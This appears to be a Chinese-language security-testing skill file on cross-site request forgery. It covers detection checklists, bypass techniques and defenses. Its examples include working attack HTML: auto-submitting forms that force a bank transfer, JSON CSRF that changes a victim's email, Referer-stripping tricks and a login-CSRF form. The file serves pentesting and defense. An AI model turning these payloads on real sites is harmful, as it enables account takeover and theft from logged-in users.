---
name: web-csrf-001
description: "Cross-Site Request Forgery (CSRF/XSRF) 检测与利用技术，用于发现和利用跨站请求伪造漏洞 适用于: Web 应用对敏感操作（转账、改密、权限变更）缺乏 CSRF 令牌验证; 应用仅依赖 Referer/Origin 头校验但可以被绕过; API 端点不使用自定义请求头或无状态 CSRF 机制"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - csrf
  - xsrf
  - cross-site-request-forgery
  - anti-csrf
  - samsite
  - cookie
  - session-hijacking
  category: web
  risk-level: high
  confidence: 0.9
---
# Cross-Site Request Forgery (CSRF) Detection & Exploitation

CSRF（跨站请求伪造）攻击迫使已登录用户的浏览器向目标 Web 应用发送恶意构造的请求，利用受害者已认证的身份执行非预期的操作。OWASP 将 CSRF 列为 Web 应用十大安全风险之一。现代浏览器引入了 SameSite Cookie 机制缓解 CSRF，但配置不当或遗留系统仍存在漏洞。

## 何时使用

### 触发场景

- Web 应用对敏感操作（转账、改密、权限变更）缺乏 CSRF 令牌验证
- 应用仅依赖 Referer/Origin 头校验 CSRF（可被绕过）
- API 端点不使用自定义请求头或无状态 CSRF 机制
- Cookie 未设置 SameSite=Lax/Strict 属性
- 遗留系统或内部应用未实施 CSRF 防护
- 应用使用 GET 请求执行敏感操作（如 ?delete=1）
- JSON API 仅依赖 CORS + Cookie 认证但缺少 CSRF token

### 关键词

`csrf`, `xsrf`, `cross-site request forgery`, `跨站请求伪造`, `anti-csrf token`, `same-origin`, `same-site`, `csrf bypass`, `cors csrf`, `json csrf`, `cookie stealing`, `session riding`

### 识别指标

- 敏感操作使用 GET 请求
- 表单中没有隐藏的 CSRF token 字段
- 请求中没有自定义请求头（如 X-CSRF-Token、X-Requested-With）
- Cookie 缺少 SameSite 属性
- Origin/Referer 校验可被绕过
- JSONP 端点可被利用构造跨站请求
- 请求的 Content-Type 未被严格校验

### 别名

`session riding`, `XSRF`, `跨站请求伪造`, `一键攻击`, `cookie 伪造`

## 操作检查清单

1. 识别所有敏感操作端点（修改密码、转账、邮件变更、权限提升、删除操作）
2. 检查请求中是否存在 CSRF token（隐藏表单字段、自定义请求头、URL 参数）
3. 检查 Cookie 的 SameSite 属性（Strict/Lax/None）
4. 测试移除 CSRF token 后请求是否被接受
5. 测试使用过期或无效 CSRF token 请求是否被接受
6. 测试 CSRF token 重绑：使用攻击者账户的 token 发送受害者请求
7. 测试 CSRF token 预测：分析 token 生成模式是否可预测
8. 测试 Referer/Origin 校验绕过：空 Referer、跨域 Referer、正则绕过
9. 测试 JSON CSRF：使用 <form> 构造 JSON body + 修改 Content-Type
10. 测试 CORS 配置错误结合 CSRF 利用
11. 测试 GET 请求 CSRF：使用 <img>/<script> 标签构造跨站请求
12. 测试多步 CSRF：模拟多表单提交流程
13. 测试登录 CSRF / 注销 CSRF
14. 验证在跨域环境中请求是否能成功执行

## 技术手段

- HTML 表单 CSRF：<form action="https://bank.com/transfer" method="POST"><input name="amount" value="10000">
- IMG 标签 CSRF（GET 请求）：<img src="https://bank.com/delete?account=123" width="0" height="0">
- XMLHttpRequest CSRF（需 CORS）：用 XHR 发送 POST/PUT/DELETE 请求
- JSON CSRF：使用表单 + enctype="text/plain" 发送 JSON payload
- Flash CSRF（已废弃）：使用 SWF 文件构造跨站请求
- CSRF token 绕过 - 重绑：使用自身 token 替换受害者 token
- CSRF token 绕过 - 泄露：通过 Referer 头或 DOM 访问泄露 token
- SameSite 绕过 - 子域名：在子域名上发起 CSRF 攻击
- SameSite 绕过 - 3秒窗口：SameSite=Lax 对 POST 后 GET 的 3 秒保护窗口
- cookie 注入 + CSRF：利用 session fixation 等先注入 cookie
- 登录 CSRF：强制用户使用攻击者控制的账户登录
- OAuth 隐式授权 CSRF：利用 state 参数缺失

## 实战经验

### 症状

- 修改密码/邮箱等敏感操作页面表单中没有明显的 CSRF token 字段
- 请求头中没有 X-CSRF-Token、X-Requested-With 等自定义头
- Cookie 无 SameSite 属性或设置为 SameSite=None
- API 端点仅使用 Cookie/Session 认证，不验证 CSRF token
- 操作响应中服务器未验证请求来源
- 开发者明确注释了 "disable CSRF for this endpoint"

### 根因分析

- 开发者认为 API 不会被浏览器跨域访问（忽略了表单提交）
- 前后端分离架构中 CSRF token 传递机制复杂被简化
- 仅依赖 CORS 策略阻止跨域（忽略了简单请求的跨域能力）
- 使用 REST API 设计但未对写操作实施 CSRF 保护
- SameSite Cookie 配置为 None 或未配置（默认值取决于浏览器版本）
- JSONP 端点被用作 CSRF 的载体
- 框架的 CSRF 防护被开发者显式禁用（如 @CrossOrigin 注解）
- Same-origin 策略被错误地等同于 CSRF 防护

### 实战观察

- 前后端分离 SPA + REST API 架构中 CSRF 防护缺失率超过 30%
- SameSite=Lax 是 Chrome 80+ 的默认值，但 SameSite 不能完全防御 CSRF
- SameSite=Lax 允许 top-level navigation GET 请求的 CSRF
- iOS/Android WebView 不强制 SameSite 规则，风险更高
- JSON CSRF 在 Spring Boot、Django REST framework 中常见
- GraphQL 端点通常使用单一端点 POST 请求，CSRF token 往往缺失
- 内部管理系统（如 Jenkins、Grafana、Kibana）常完全无 CSRF 防护
- Referer 校验使用字符串包含匹配（如 check Referer 包含 domain.com）是最容易绕过的防御

### 常见错误

- 认为 HTTPS 可以防御 CSRF
- 认为 CORS 配置可以完全阻止 CSRF
- 认为 POST 请求不会被 <img> 标签利用（忽略了 <form> 提交）
- 忽略自定义 Header 的 CSRF token 也可被读取（通过 XSS 或其他方式）
- 认为 CSRF token 使用时间戳 + MD5 就足够安全（token 可预测）
- 只检查是否包含 token 不验证 token 的有效性和绑定关系
- 忽略 JSON Content-Type 的 CSRF 攻击方式

### 补充说明

- CSRF 成功的前提是受害者已登录目标站点（具有有效的 session cookie）
- SameSite 的浏览器兼容性：Chrome 80+ 默认 Lax，Firefox 和 Safari 较晚支持
- OWASP CSRF 防护建议：使用 Synchronizer Token Pattern 或 Double Submit Cookie
- CSRF 通常结合 XSS、CORS 等其他漏洞实现更大危害
- HTTP 请求头中的 Sec-Fetch-* 系列头（Sec-Fetch-Site、Sec-Fetch-Mode）可用于服务端检测
- 登录和注销也应该是 CSRF 防护的重点

## 示例

### 基础 HTML 表单 CSRF

利用表单提交跨站执行敏感操作

```
攻击者构造的恶意页面 (attacker.com/exploit.html):

<html>
  <body>
    <h1>查看优惠信息</h1>
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="toAccount" value="123456789">
      <input type="hidden" name="amount" value="10000">
      <input type="submit" value="领取优惠券">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>

原理: 用户访问攻击者页面时，表单自动提交到 bank.com
     浏览器自动携带 bank.com 的 session cookie
     服务器收到请求后执行转账操作
防御: 表单中包含不可预测的 CSRF token 并由服务端验证
```

### SameSite 配置分析与绕过

分析 Cookie SameSite 属性并利用绕过方式

```
检查 Cookie:
Set-Cookie: session=abc123; Path=/; HttpOnly; Secure

缺少 SameSite → 浏览器默认 SameSite=Lax (Chrome 80+)
SameSite=None → 跨站请求允许发送 Cookie（需要 Secure 标志）
SameSite=Lax → 仅允许 top-level navigation GET 请求发送 Cookie
SameSite=Strict → 完全禁止跨站请求携带 Cookie

SameSite=Lax 绕过场景:
利用 GET 请求 + <a> 标签或 window.location 导航
GET /api/deleteUser?id=123

表单 POST 后跟随 GET 重定向（3秒内有效）:
1. 攻击页面 POST 提交到目标站点
2. 服务器返回 302 重定向到管理操作
3. 如果重定向在 3 秒内完成，SameSite 保护可能被绕过
```

### JSON CSRF 绕过 Content-Type 检查

利用表单的 enctype="text/plain" 发送 JSON 请求体

```
目标 API:
POST /api/changeEmail
Content-Type: application/json
{"email": "attacker@evil.com"}

方法 1 - 表单提交:
<form action="https://target.com/api/changeEmail" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","_csrf":' value='"}'>
  <input type="submit">
</form>
请求体: {"email":"attacker@evil.com","_csrf":=""}（服务端拼接成有效 JSON）

方法 2 - XHR + CORS（需服务端配置宽松 CORS）:
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/changeEmail');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.withCredentials = true;
xhr.send(JSON.stringify({email: 'attacker@evil.com'}));
```

### CSRF Token 绕过 - Referer 校验

绕过基于 Referer 头的 CSRF 防护

```
常见 Referer 校验规则:
1. 检查 Referer 是否包含 domain.com
2. 检查 Referer 是否以 https://domain.com 开头
3. 检查 Referer 是否等于 https://domain.com

绕过方式:
1. 缺失 Referer → 使用 <meta name="referrer" content="never">
2. 子域名绕过: https://domain.com.attacker.com/exploit.html
3. 路径包含绕过: https://attacker.com/domain.com/exploit.html
4. 正则绕过: https://domain.com.attacker.com（如检查末尾 .com）
5. 空 Referer 绕过: 使用 about:blank 或 data: URL

实施:
<meta name="referrer" content="no-referrer">
<form action="https://target.com/transfer">...</form>
```

### CSRF Token 泄露利用

通过 Referer 头泄露的 CSRF token 构造攻击

```
步骤 1: 攻击者发送带有 CSRF token 的请求给受害者
GET /profile HTTP/1.1（返回包含 CSRF token 的修改表单）

步骤 2: 攻击者引诱受害者点击第三方链接，浏览器发送 Referer 头
Referer: https://target.com/profile?_csrf=abc123xyz

步骤 3: 攻击者从 Referer 头中提取 CSRF token，构造恶意请求
<form action="https://target.com/changeEmail" method="POST">
  <input type="hidden" name="_csrf" value="abc123xyz">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

原理: HTTPS→HTTP 请求不发送 Referer，但 HTTPS→HTTPS 的跨域请求仍会发送
      Referrer-Policy: strict-origin-when-cross-origin 是浏览器默认策略
防御: 使用 Referrer-Policy: same-origin 或 no-referrer
      CSRF token 不在 URL 参数中传递
```

### 登录 CSRF 攻击

强制用户使用攻击者控制的账户登录，诱使用户在不知情下以攻击者身份操作

```
攻击流程:
1. 攻击者创建账户: attacker123 / password123
2. 构造 CSRF 页面强制用户登录该账户:
   <form action="https://target.com/login" method="POST">
     <input type="hidden" name="username" value="attacker123">
     <input type="hidden" name="password" value="password123">
   </form>
   <script>document.forms[0].submit();</script>
3. 受害者在登录状态下进行敏感操作（如保存信用卡信息）
4. 攻击者登录自己的账户，查看受害者保存的信息

原理: 用户在 CSRF 登录后，当前 session 绑定到攻击者的账户
     受害者以为自己在执行操作，实际在攻击者的账户上下文中
```

## 验证标准

### 验证指标

- 移除 CSRF token 后请求仍被服务端接受（200 OK）
- 使用无效/过期的 token 请求仍被处理
- 跨域表单提交成功执行敏感操作
- Referer/Origin 校验被成功绕过
- 自动提交的 IMG/SCRIPT 标签成功触发 GET 请求操作
- 无 Cookie SameSite 属性或 SameSite=None

### 成功标志

- 成功通过跨站请求执行了用户密码修改
- 成功通过 CSRF 转账或修改敏感配置
- CSRF token 绕过成功，所有 CSRF 测试 payload 均有效
- 发现完全无 CSRF 防护的敏感操作端点

### 误报标志

- 请求返回 200 但操作实际未执行（响应为假成功）
- 跨域请求被 CORS 或浏览器策略真正阻止
- 请求被执行但已验证的 session cookie 并非受害者当前会话
- 操作需要二次确认（如邮件验证码）但被忽略

## 防御建议

### 推荐做法

- 实施 Synchronizer Token Pattern：服务端生成 token 嵌入表单，提交时验证
- 使用 SameSite Cookie：Strict 或 Lax（根据业务场景选择）
- 使用 Double Submit Cookie：随机 token 同时在 Cookie 和请求头中
- 对 API 端点使用自定义请求头（X-Requested-With、X-CSRF-Token）
- 敏感操作实施二次确认（如重新输入密码、发送验证码）
- 避免使用 GET 请求执行写操作
- 实施 Origin/Referer 校验（使用严格匹配而非包含匹配）
- 对 JSON API 检查 Content-Type 并校验 CSRF token

### 缓解措施

- 尽快升级到现代框架（Spring Security、ASP.NET AntiForgery、Laravel CSRF）
- 实施 CSRF token 与用户 session 的强绑定
- 使用 Security Headers（Referrer-Policy、SameSite Cookie）
- 对非浏览器客户端（移动端、API 调用）使用 API Key 替代 Cookie 认证
- 定期自动化扫描 CSRF 漏洞
- 敏感操作添加审计日志

## 参考链接

- https://owasp.org/www-community/attacks/csrf
- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- https://portswigger.net/web-security/csrf
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- https://web.dev/samesite-cookies-explained/
